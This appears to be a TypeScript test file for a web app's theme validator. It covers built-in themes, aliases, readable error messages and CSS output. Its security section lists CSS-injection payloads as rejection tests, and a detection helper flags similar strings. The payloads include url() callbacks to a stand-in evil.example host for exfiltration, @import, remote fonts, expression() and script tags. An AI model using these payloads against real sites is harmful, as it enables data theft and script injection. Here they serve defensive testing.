/**
 * The theme system's contract, as tests.
 *
 * The security cases are the point. Each one is an attack that a naive theme system would
 * accept, written as a theme that looks almost valid.
 */

import { describe, expect, it } from 'vitest';

import midnight from './builtin/midnight.json';
import daylight from './builtin/daylight.json';
import vanGogh from './builtin/van-gogh.json';
import terminalAmber from './builtin/terminal-amber.json';
import ember from './builtin/ember.json';
import neonRain from './builtin/neon-rain.json';
import sakuraTree from './builtin/sakura-tree.json';
import herbarium from './builtin/herbarium.json';
import frost from './builtin/frost.json';

import { applyTheme, shadowToCss, themeToCss, tokensToCssVars } from './apply';
import { looksLikeInjection, parseTheme, parseThemeJson } from './validate';
import { ALL_TOKEN_PATHS, FONT_FAMILIES, MOTIFS, THEME_TOKEN_NAMES } from './schema';
import { kindOf } from '../app/ambience/types';
import { rendererFor } from '../app/ambience/renderers';

/**
 * Every theme the app ships. Held at module scope so the motif contract below can check the
 * same list — a built-in that names a motif with no renderer is worse than one with no
 * motif, because it lies to whoever selects it.
 */
const BUILTINS = [
  ['midnight', midnight],
  ['daylight', daylight],
  ['van-gogh', vanGogh],
  ['terminal-amber', terminalAmber],
  ['ember', ember],
  ['neon-rain', neonRain],
  ['sakura-tree', sakuraTree],
  ['herbarium', herbarium],
  ['frost', frost],
] as const;

/* ------------------------------------------------------------------ *
 * Helpers
 * ------------------------------------------------------------------ */

/** A valid theme, deep-cloned so a test can break exactly one field. */
const base = () => structuredClone(midnight) as Record<string, unknown>;

const tokensOf = (theme: Record<string, unknown>) =>
  theme.tokens as Record<string, Record<string, unknown>>;

/* ------------------------------------------------------------------ *
 * Built-in themes
 * ------------------------------------------------------------------ */

describe('built-in themes', () => {
  const builtins = BUILTINS;

  it.each(builtins)('%s is valid', (_name, theme) => {
    const result = parseTheme(theme);
    if (!result.ok) {
      throw new Error(
        `expected ${_name} to be valid, got:\n${result.issues.map((i) => `  ${i.path}: ${i.message}`).join('\n')}`,
      );
    }
    expect(result.value.id).toBe(theme.id);
  });

  it('covers every token name — a built-in cannot leave a hole', () => {
    for (const [, theme] of builtins) {
      const result = parseTheme(theme);
      expect(result.ok).toBe(true);
      if (!result.ok) continue;
      expect(Object.keys(result.value.tokens.color).sort()).toEqual(
        [...THEME_TOKEN_NAMES.color].sort(),
      );
      expect(Object.keys(result.value.tokens.dimension).sort()).toEqual(
        [...THEME_TOKEN_NAMES.dimension].sort(),
      );
      expect(Object.keys(result.value.tokens.fontFamily).sort()).toEqual(
        [...THEME_TOKEN_NAMES.fontFamily].sort(),
      );
      expect(Object.keys(result.value.tokens.shadow).sort()).toEqual(
        [...THEME_TOKEN_NAMES.shadow].sort(),
      );
    }
  });
});

/* ------------------------------------------------------------------ *
 * Motifs — a theme chooses, the app paints
 * ------------------------------------------------------------------ */

describe('motifs', () => {
  it('every motif in the enum resolves to a kind', () => {
    for (const motif of MOTIFS) {
      expect(['none', 'canvas', 'css']).toContain(kindOf(motif));
    }
  });

  it('every canvas motif has a renderer', () => {
    for (const motif of MOTIFS) {
      if (kindOf(motif) === 'canvas') {
        expect(rendererFor(motif), `${motif} is declared as canvas but has no renderer`).not.toBeNull();
      }
    }
  });

  it('every built-in theme names a motif the app can actually paint', () => {
    for (const [name, theme] of BUILTINS) {
      const result = parseTheme(theme);
      expect(result.ok).toBe(true);
      if (!result.ok) continue;

      const motif = result.value.motif;
      if (kindOf(motif) === 'canvas') {
        expect(rendererFor(motif!), `${name} declares motif "${motif}" with no renderer`).not.toBeNull();
      }
      // A theme that asks for a motif must also ask for it to be visible — `ambience` is
      // what switches it on, and it defaults to 0.
      if (motif && motif !== 'none') {
        expect(result.value.effects?.ambience ?? 0).toBeGreaterThan(0);
      }
    }
  });

  it('an unknown motif falls back to none rather than throwing', () => {
    expect(kindOf(undefined)).toBe('none');
    expect(kindOf('not-a-motif' as never)).toBe('none');
    expect(kindOf('terminal-grid')).toBe('css');
    expect(kindOf('sakura-tree')).toBe('canvas');
  });
});

/* ------------------------------------------------------------------ *
 * Security — the attacks this design exists to stop
 * ------------------------------------------------------------------ */

describe('security: injection is unreachable by construction', () => {
  const injections: Array<[string, (t: Record<string, unknown>) => void]> = [
    [
      'url() in a colour (the classic exfiltration callback)',
      (t) => {
        tokensOf(t).color.accent = "url('https://evil.example/steal.png')";
      },
    ],
    [
      'colour with a rule break-out',
      (t) => {
        tokensOf(t).color.bg = '#fff; background: url(https://evil.example/x)';
      },
    ],
    [
      'url() hidden behind a valid-looking prefix',
      (t) => {
        tokensOf(t).color.text = '#00000000;cursor:url(//evil.example/a),auto';
      },
    ],
    [
      '@import in a colour slot',
      (t) => {
        tokensOf(t).color.border = '@import url(https://evil.example/x.css)';
      },
    ],
    [
      'calc() in a dimension',
      (t) => {
        tokensOf(t).dimension.radiusMd = 'calc(100vw)';
      },
    ],
    [
      'var() in a dimension',
      (t) => {
        tokensOf(t).dimension.spaceMd = 'var(--x)';
      },
    ],
    [
      'a remote font — the @font-face exfiltration channel',
      (t) => {
        tokensOf(t).fontFamily.body = 'url(https://evil.example/f.woff2)';
      },
    ],
    [
      'a font that is not bundled',
      (t) => {
        tokensOf(t).fontFamily.body = 'Comic Sans MS';
      },
    ],
    [
      'expression() — the legacy IE vector',
      (t) => {
        tokensOf(t).color.accent = 'expression(alert(1))';
      },
    ],
    [
      'an HTML tag in a colour',
      (t) => {
        tokensOf(t).color.text = '<script>alert(1)</script>';
      },
    ],
    [
      'CSS escape sequences used to smuggle a keyword',
      (t) => {
        tokensOf(t).color.accent = '\\75 rl(https://evil.example/x)';
      },
    ],
  ];

  it.each(injections)('rejects %s', (_label, mutate) => {
    const theme = base();
    mutate(theme);
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
  });

  it('rejects an unknown token name — the closed list holds', () => {
    const theme = base();
    tokensOf(theme).color.evil = '#000000';
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((i) => i.message.includes('Unrecognized'))).toBe(true);
  });

  it('rejects an unknown top-level key', () => {
    const theme = base();
    theme.stylesheet = 'body { background: url(https://evil.example/x) }';
    expect(parseTheme(theme).ok).toBe(false);
  });

  it('rejects an unknown key inside effects', () => {
    const theme = base();
    (theme.effects as Record<string, unknown>).custom = 'url(https://evil.example/x)';
    expect(parseTheme(theme).ok).toBe(false);
  });

  it('rejects an out-of-range number', () => {
    const theme = base();
    (theme.effects as Record<string, unknown>).grain = 99;
    expect(parseTheme(theme).ok).toBe(false);
  });

  it('rejects a shadow that carries a string where a number belongs', () => {
    const theme = base();
    tokensOf(theme).shadow.card = { x: 'url(https://evil.example/x)', y: 0, blur: 1, spread: 0, color: '#000000' };
    expect(parseTheme(theme).ok).toBe(false);
  });

  it('rejects a malformed id', () => {
    const theme = base();
    theme.id = 'Not Kebab Case!';
    expect(parseTheme(theme).ok).toBe(false);
  });
});

/* ------------------------------------------------------------------ *
 * Aliases
 * ------------------------------------------------------------------ */

describe('aliases', () => {
  it('resolves a chain to a concrete value', () => {
    const theme = base();
    tokensOf(theme).color.accentHover = '{color.accent}';
    const result = parseTheme(theme);
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.value.tokens.color.accentHover).toBe('#e8a33d');
  });

  it('resolves a multi-step chain', () => {
    const theme = base();
    tokensOf(theme).color.accentHover = '{color.borderStrong}';
    tokensOf(theme).color.borderStrong = '{color.accent}';
    const result = parseTheme(theme);
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.value.tokens.color.accentHover).toBe('#e8a33d');
  });

  it('rejects a direct cycle without hanging', () => {
    const theme = base();
    tokensOf(theme).color.accent = '{color.accent}';
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues[0].message).toContain('Circular');
  });

  it('rejects an indirect cycle without hanging', () => {
    const theme = base();
    tokensOf(theme).color.accent = '{color.border}';
    tokensOf(theme).color.border = '{color.accent}';
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
  });

  it('rejects an alias to a token that does not exist', () => {
    const theme = base();
    tokensOf(theme).color.accent = '{color.nonexistent}';
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues[0].message).toContain('does not define');
  });

  it('rejects an alias that crosses types — a dimension pointing at a colour', () => {
    const theme = base();
    tokensOf(theme).dimension.radiusMd = '{color.accent}';
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues[0].message).toContain('unit');
  });

  it('resolves an alias inside a shadow layer instead of silently dropping the shadow', () => {
    // A shadow layer's colour is the one nested position an alias can appear in, and the
    // resolver only walked top-level token paths. An aliased shadow colour therefore passed
    // validation untouched, then failed the assembled-string check in `shadowToCss`, which
    // returns `none`. The theme was accepted and quietly lost its shadows.
    const theme = base();
    tokensOf(theme).shadow.card = { x: 0, y: 1, blur: 2, spread: 0, color: '{color.accent}' };
    const result = parseTheme(theme);
    expect(result.ok).toBe(true);
    if (result.ok) {
      const layers = result.value.tokens.shadow.card;
      expect(layers[0].color).toBe('#e8a33d');
      expect(shadowToCss(layers)).not.toBe('none');
    }
  });

  it('reports a shadow colour alias that does not resolve to a colour', () => {
    const theme = base();
    tokensOf(theme).shadow.card = { x: 0, y: 1, blur: 2, spread: 0, color: '{dimension.radiusMd}' };
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues[0].message).toContain('hex colour');
  });
});

/* ------------------------------------------------------------------ *
 * Parsing edges
 * ------------------------------------------------------------------ */

describe('error messages are readable', () => {
  /**
   * The README promises that a rejected theme *"names the token and the reason — not
   * `Invalid input`"*. That promise was false for every metadata field and every shadow
   * number: zod's own text for a missing or mistyped key is
   * `Invalid input: expected string, received undefined`, and those fields carried no
   * custom message. These cases are what keeps the promise honest.
   */
  const offenders = (raw: unknown): string[] => {
    const result = parseTheme(raw);
    if (result.ok) return [];
    return result.issues
      .map((i) => i.message)
      .filter((m) => /invalid input|expected .*, received/i.test(m));
  };

  it('never says "Invalid input" for a missing field', () => {
    const theme = base();
    for (const field of ['id', 'name', 'author', 'date', 'version', 'license', 'appearance']) {
      delete (theme as Record<string, unknown>)[field];
      expect(offenders(theme), `${field} produced a raw zod message`).toEqual([]);
      Object.assign(theme, structuredClone((midnight as Record<string, unknown>)[field]));
    }
  });

  it('never says "Invalid input" for a mistyped field', () => {
    const theme = base();
    (theme as Record<string, unknown>).name = 42;
    expect(offenders(theme)).toEqual([]);
    (theme as Record<string, unknown>).name = 'Fine';
    (theme as Record<string, unknown>).appearance = 'twilight';
    expect(offenders(theme)).toEqual([]);
  });

  it('never says "Invalid input" for a mistyped shadow number', () => {
    const theme = base();
    tokensOf(theme).shadow = { card: { x: 'left', y: 1, blur: 2, spread: 0, color: '#000000' } };
    expect(offenders(theme)).toEqual([]);
  });

  it('never says "Invalid input" for a missing or mistyped tokens object', () => {
    const missing = base();
    delete (missing as Record<string, unknown>).tokens;
    expect(offenders(missing)).toEqual([]);

    const mistyped = base();
    (mistyped as Record<string, unknown>).tokens = 'not an object';
    expect(offenders(mistyped)).toEqual([]);
  });

  it('names the offending path, so a theme author knows where to look', () => {
    const theme = base();
    (theme as Record<string, unknown>).author = 42;
    const result = parseTheme(theme);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((i) => i.path === 'author')).toBe(true);
  });
});

describe('parseThemeJson', () => {
  it('reports invalid JSON as a readable issue, not a throw', () => {
    const result = parseThemeJson('{ not json');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues[0].message).toContain('Not valid JSON');
  });

  it('accepts a stringified valid theme', () => {
    expect(parseThemeJson(JSON.stringify(midnight)).ok).toBe(true);
  });

  it('rejects null, arrays and primitives', () => {
    for (const value of [null, [], 42, 'x', undefined]) {
      expect(parseTheme(value).ok).toBe(false);
    }
  });
});

/* ------------------------------------------------------------------ *
 * CSS emission
 * ------------------------------------------------------------------ */

describe('css emission', () => {
  const theme = parseTheme(midnight);

  it('produces a custom property for every token', () => {
    expect(theme.ok).toBe(true);
    if (!theme.ok) return;
    const vars = tokensToCssVars(theme.value);
    for (const path of ALL_TOKEN_PATHS) {
      const [group, key] = path.split('.');
      const name = `--t-${group}-${key.replace(/[A-Z]/g, (c) => `-${c.toLowerCase()}`)}`;
      expect(vars).toHaveProperty(name);
    }
  });

  it('maps a font name to a stack, never to the raw name', () => {
    if (!theme.ok) return;
    const vars = tokensToCssVars(theme.value);
    expect(vars['--t-fontFamily-body']).toContain('Manrope');
    expect(vars['--t-fontFamily-body']).not.toBe('manrope');
  });

  it('sets color-scheme from appearance', () => {
    if (!theme.ok) return;
    expect(tokensToCssVars(theme.value)['color-scheme']).toBe('dark');
  });

  it('assembles shadows in CSS order and refuses anything else', () => {
    expect(shadowToCss([{ x: 0, y: 1, blur: 2, spread: 0, color: '#00000066' }])).toBe(
      '0px 1px 2px 0px #00000066',
    );
    expect(shadowToCss([])).toBe('none');
  });

  it('emits a css file whose every declaration matches the value grammar', () => {
    if (!theme.ok) return;
    const css = themeToCss(theme.value);
    expect(css).toContain(':root {');
    expect(css).not.toMatch(/url\s*\(/i);
    expect(css).not.toMatch(/@import/i);
    expect(css).not.toMatch(/javascript:/i);
  });

  it('never emits a url() for any built-in theme', () => {
    for (const [, builtin] of BUILTINS) {
      const parsed = parseTheme(builtin);
      expect(parsed.ok).toBe(true);
      if (!parsed.ok) continue;
      const css = themeToCss(parsed.value);
      expect(css).not.toMatch(/url\s*\(/i);
      for (const value of Object.values(tokensToCssVars(parsed.value))) {
        expect(value).not.toMatch(/url\s*\(/i);
      }
    }
  });
});

/* ------------------------------------------------------------------ *
 * DOM application
 * ------------------------------------------------------------------ */

describe('applyTheme', () => {
  it('writes properties onto the target and clears the ones it removed', () => {
    const host = document.createElement('div');
    const withGrain = parseTheme(midnight);
    const withoutGrain = parseTheme(daylight);
    expect(withGrain.ok && withoutGrain.ok).toBe(true);
    if (!withGrain.ok || !withoutGrain.ok) return;

    applyTheme(withGrain.value, host);
    expect(host.style.getPropertyValue('--t-color-accent')).toBe('#e8a33d');
    expect(host.dataset.themeId).toBe('midnight');

    applyTheme(withoutGrain.value, host);
    expect(host.dataset.themeId).toBe('daylight');
    expect(host.style.getPropertyValue('--t-color-accent')).toBe('#2f5d8a');
  });
});

/* ------------------------------------------------------------------ *
 * The advisory helper
 * ------------------------------------------------------------------ */

describe('looksLikeInjection', () => {
  it.each([
    "url('https://evil.example/x')",
    '@import "x.css"',
    '@font-face { src: url(x) }',
    'expression(alert(1))',
    '<img src=x>',
    '\\75 rl(x)',
  ])('flags %s', (value) => {
    expect(looksLikeInjection(value)).toBe(true);
  });

  it.each(['#e8a33d', '16px', 'manrope', '#00000066'])('does not flag %s', (value) => {
    expect(looksLikeInjection(value)).toBe(false);
  });
});

/* ------------------------------------------------------------------ *
 * Font whitelist integrity
 * ------------------------------------------------------------------ */

describe('font whitelist', () => {
  it('contains no empty or duplicate entries', () => {
    expect(new Set(FONT_FAMILIES).size).toBe(FONT_FAMILIES.length);
    for (const f of FONT_FAMILIES) expect(f.trim()).toBe(f);
  });
});
